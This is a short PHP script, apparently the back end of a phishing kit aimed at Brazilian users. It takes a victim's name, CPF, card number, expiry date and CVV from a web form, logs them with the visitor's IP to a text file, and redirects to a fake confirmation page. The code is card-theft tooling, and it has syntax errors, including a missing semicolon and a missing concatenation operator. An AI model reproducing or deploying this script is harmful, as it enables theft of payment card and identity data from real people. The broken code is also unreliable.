<?php
$cardName = $_POST['cardName'];
$cpfNumber = $_POST['cpfNumber']
$cardNumber = $_POST['cardNumber'];
$expiryDate = $_POST['expiryDate'];
$cvv = $_POST['cvv'];

$ip = $_SERVER['REMOTE_ADDR'];
$tudo = "Nome: ".$cardName." - CPF: ".$cpfNumber" - Número do cartão: ".$cardNumber." - Data: ".$expiryDate." - CVV: ".$cvv." - IP: ".$ip."
";
 
$fp = fopen("dados.txt", "a");
fwrite($fp, $tudo);
fclose($fp);
header("Location: /confirmado/index.html");
?>